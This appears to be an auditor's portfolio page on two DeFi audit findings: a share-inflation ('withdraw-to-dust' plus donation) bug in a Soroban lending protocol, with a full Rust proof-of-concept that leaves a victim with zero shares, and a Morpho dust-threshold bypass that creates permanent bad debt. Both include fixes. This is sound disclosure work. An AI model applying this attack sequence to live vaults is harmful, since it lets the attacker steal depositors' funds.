My Code4rena Profile: https://code4rena.com/@Peter3144

My Cantina Profile: 
https://cantina.xyz/u/Peter3144

# Web3 Security Architecture & Vulnerability Research Portfolio

## Technical Profile
An elite-tier, highly analytical smart contract security researcher with an extensively validated baseline in multi-layered decentralized architectures. Combines competitive on-chain validation with a rigorous mathematical pedigree (Diocesan Mathematics Champion) and rapid problem-solving capabilities. Highly versatile across distinct virtual machines, execution layers, and low-level development patterns, executing high-signal adversarial manual code reviews that routinely bypass traditional static analysis and formal automated verifiers.

---

## Technical Skillset Matrix

* **Smart Contract Architecture:** Solidity, EVM Low-Level Storage Topography, Inline Assembly (Yul)
* **Systems Languages & WASM:** Rust, Soroban SDK (Stellar WASM Execution Environment)
* **Adversarial Tooling & Analytics:** Foundry Testing Ecosystem, Slither Static Topography, Automated Fuzzing Mechanics
* **Domain Expertise:** Liquidity Index Mechanics, De-pegging & Flash-Loan Manipulation Vectors, Fixed-Rate Lending Invariants, Cross-Contract State Integrity

---

## Chronological Audit Exploitation Track Record

### 1. Code4rena Audit Competition: K2 Lending Infrastructure Protocol (May 2026)
* **Ecosystem Platform:** Stellar WebAssembly (Soroban SDK / Rust)
* **Assigned Severity:** **Medium Severity Vulnerability**
* **Vulnerability Target Vector:** `kinetic_router/src/operations.rs`  Missing State-Enforcement on Vault Withdrawal Flow
* **Exploit Mechanism Classification:** Share Inflation & Economic Attack Vector

#### Vulnerability Context & Technical Breakdown
The K2 protocol attempts to mitigate inflation attacks on newly deployed lending reserves by implementing a minimum first deposit defense threshold (`MIN_FIRST_DEPOSIT`) within its `supply()` execution flow. The mechanism enforces a minimum threshold of atomic units to anchor the inaugural share price. 

However, the architecture contains a severe logic asymmetric flaw: while the `supply()` sequence contains strict controls, the corresponding `withdraw()` function in `kinetic_router/src/operations.rs` fails to enforce any structural rules regarding the remaining pool supply state. It allows users to drain balances completely uninhibited as long as they hold the corresponding shares.

An adversarial actor can easily circumvent the security invariant through a coordinated **"withdraw-to-dust"** script. The attacker deposits an amount matching the `MIN_FIRST_DEPOSIT` threshold to satisfy the initialization check, immediately calls `withdraw()` to extract all but 1 atomic share unit ("dust"), and retains full control over an un-anchored pool. By bypassing the `is_first_supply` state trigger for future depositors, the attacker can execute an out-of-band direct asset donation to the underlying `aToken` ledger. This forcefully expands the asset balance while total shares remain locked at 1, causing an astronomical spike in the pool's Liquidity Index. 

When a subsequent legitimate user deposits capital, the protocol calculates their incoming shares via integer division using `ray_div_down`. Because the exchange rate has been artificially inflated, the mathematical output rounds down to zero shares. The victim loses 100% of their principal asset to the vault, which the attacker then extracts completely by redeeming their singular dust share.

#### Executable Rust Proof of Concept (PoC)
The following reproducible test suite replicates the precise sequence of the share inflation attack vector within the native Soroban SDK validation layer:

```rust
// --- VULNERABILITY REPRODUCTION ---

// STEP 1: Attacker passes M-04 check using the EXACT protocol constant (1,000 atomic units).
// Note: For a 7-decimal token, this is only 0.0001 tokens.
let min_first_deposit = 1_000; 

asset_mint.mint(&attacker, &(min_first_deposit as i128));
asset_client.approve(&attacker, &setup.router_addr, &(min_first_deposit as i128), &2000);

// This passes because 1000 is NOT < 1000
setup.router.supply(&attacker, &asset_c, &min_first_deposit, &attacker, &0u32);

// STEP 2: Withdraw to Dust (Leave exactly 1 atomic unit of shares)
let withdraw_amount = min_first_deposit - 1; // 999
setup.router.withdraw(&attacker, &asset_c, &withdraw_amount, &attacker);

// STEP 3: Inflation via Direct Donation
// We donate 10,000 "whole" tokens (10,000 * 10^7) to maximize the index spike.
let donation_amount = 10_000 * 10u128.pow(7);
asset_mint.mint(&a_token_c, &(donation_amount as i128));

// STEP 4: Victim supplies 500 "whole" tokens.
// Calculation: 500e7 / 10000e7 (approx) = 0.04... -> Rounds to 0 shares.
let victim_deposit = 500 * 10u128.pow(7);
asset_mint.mint(&victim, &(victim_deposit as i128));
asset_client.approve(&victim, &setup.router_addr, &(victim_deposit as i128), &2000);
setup.router.supply(&victim, &asset_c, &victim_deposit, &victim, &0u32);

// STEP 5: Verification
let victim_shares = a_token_client.balance(&victim);
assert_eq!(victim_shares, 0, "Victim received 0 shares due to inflated index.");

// Attacker redeems their 1 share to capture the entire vault balance
setup.router.withdraw(&attacker, &asset_c, &u128::MAX, &attacker);

let attacker_final = asset_client.balance(&attacker) as u128;
assert!(attacker_final >= victim_deposit, "Attacker successfully captured victim principal.");
```

#### Professional Remediation Strategies
1. **Dynamic Supply Remainder Validations:** Update the `withdraw()` logic to actively query the remaining pool supply post-transaction. If a withdrawal would drop the total shares below a predefined secure threshold (without wiping it out to absolute zero), the sequence must revert:
   ```rust
   let remaining_supply = total_supply.checked_sub(amount_to_withdraw).unwrap();
   if remaining_supply > 0 && remaining_supply < k2_shared::MINIMUM_THRESHOLD {
       return Err(KineticRouterError::InvalidWithdrawalAmount);
   }
   ```
2. **Permanent Virtual Liquidity Floor (Dead Shares):** Permanently burn the inaugural 1,000 shares during the initial reserve minting sequence by assigning them to a dead address, raising the capital requirements of a manipulation vector beyond profitability thresholds.
3. **Internal Accounting Isolation:** Restructure the Liquidity Index calculator inside `calculation.rs` to query a protected internal state tracking variable (`total_managed_assets`) instead of dynamically scanning the real-time contract token balance via external `balance_of` lookups.

---

### 2. Cantina Audit Competition: Morpho Midnight Fixed-Rate Credit Protocol (June 2026)
* **Ecosystem Platform:** Ethereum Virtual Machine (Solidity)
* **Assigned Severity:** **Validated Quality Assurance / Low Severity Issue**
* **Vulnerability Target Vector:** `repay` & `withdrawCollateral` State Intersections
* **Exploit Mechanism Classification:** Dust Engineering & Permanent Bad Debt Invariant Breaking

#### Vulnerability Context & Technical Breakdown
The Morpho Midnight protocol establishes an on-chain, market-level parameter known as the `dustThreshold`. The explicit purpose of this parameterâ€”as documented across its architectural whitepaper specificationsâ€”is to guarantee that any outstanding unhealthy debt position remains economically viable for external liquidators to clean up relative to the underlying gas dynamics of the host blockchain network.

While Morpho Midnight's core codebases are hyper-optimized and subjected to strict automated formal mathematical verification models (meaning the global community uncovered zero High or Medium severity defects during the event), a critical system integration gap was identified. The safety enforcement checks ensuring a position cannot fall below the `dustThreshold` are isolated exclusively within the liquidation processing loop. The `repay` and `withdrawCollateral` functions contain zero systemic checks regarding the residual state of the position.

Consequently, any participant can organically or deliberately bypass the security boundaries. A user can establish a standard healthy borrowing position, wait, and subsequently execute an explicit sequence of `repay` and `withdrawCollateral` calls designed to downscale their liabilities directly below the `dustThreshold` parameter line. 

This shifts the debt profile into a structurally unliquidatable state. Because the liquidation execution costs outpace the value of the collateral backing it, rational liquidators will refuse to interact with the position. Critically, because bad debt socialization mechanics in the protocol are bound tightly to active liquidation triggers, this bad debt sits permanently hidden on-chain. It can never be expunged or cleaned up, permanently inflating the system's `totalUnits` track and misrepresenting pool solvency.

```solidity
// Vulnerable Implementation within the Core State Loop:
function repay(...) external {
    // Debt reduced with no minimum remainder enforced
    position[id][onBehalf].debt -= UtilsLib.toUint128(units);
    marketState[id].withdrawable += UtilsLib.toUint128(units);
    // ...
}
```

#### Professional Remediation Strategies
The security invariant must be aggressively enforced across all state-altering access routes to prevent position degradation. The `repay` and `withdrawCollateral` functions must be upgraded to check that if any position liabilities or collateral items remain post-execution, they must register above the market's defined floor parameters:

```solidity
// Mitigation Enforcement for Repayment Sequences:
uint256 remainingDebt = position[id][onBehalf].debt;
require(
    remainingDebt == 0 || remainingDebt >= market.dustThreshold,
    RemainingDebtBelowDustThreshold()
);

// Mitigation Enforcement for Collateral Withdrawal Sequences:
uint256 remainingCollateralValue = /* collateral * price / ORACLE_PRICE_SCALE */;
require(
    remainingCollateralValue == 0 || remainingCollateralValue >= market.dustThreshold,
    RemainingCollateralBelowDustThreshold()
);
```